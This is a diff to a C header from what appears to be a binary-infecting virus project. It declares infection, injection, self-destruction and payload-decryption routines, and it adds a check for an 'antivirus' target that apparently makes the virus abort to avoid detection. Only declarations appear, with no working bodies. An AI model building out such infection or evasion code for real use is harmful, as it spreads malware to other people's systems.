@@ -37,6 +37,8 @@
 
 #define JMP_SIZE 5
 
+#define TARGET "antivirus"
+
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
 ////////////////////////////////////////////////////////////////////////////////
@@ -45,6 +47,7 @@ enum e_context
 {
 	SUCCESS,
 	FAILURE,
+	ABORT,
 };
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -117,7 +120,7 @@ void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
-void execution(const struct s_host *host, struct s_keychain *keychain);
+void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context);
 
 void __exit(void);
 
@@ -129,6 +132,7 @@ __attribute__((hot)) void decrypt_right(const struct s_keychain *keychain, char 
 
 // SYSCALL
 uid_t _getuid(void);
+ssize_t _read(int fd, void *buf, size_t count);
 int _open(const char *pathname, int flags, mode_t mode);
 int _close(int fd);
 int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
@@ -143,5 +147,6 @@ size_t _strlen(const char *str);
 void _bzero(char *str, const size_t size);
 size_t _get_random_integer(const size_t range);
 void _memcpy(void *dst, void const *src, const size_t size);
+int _strncmp(const char *s1, const char *s2, size_t n);
 
 #endif
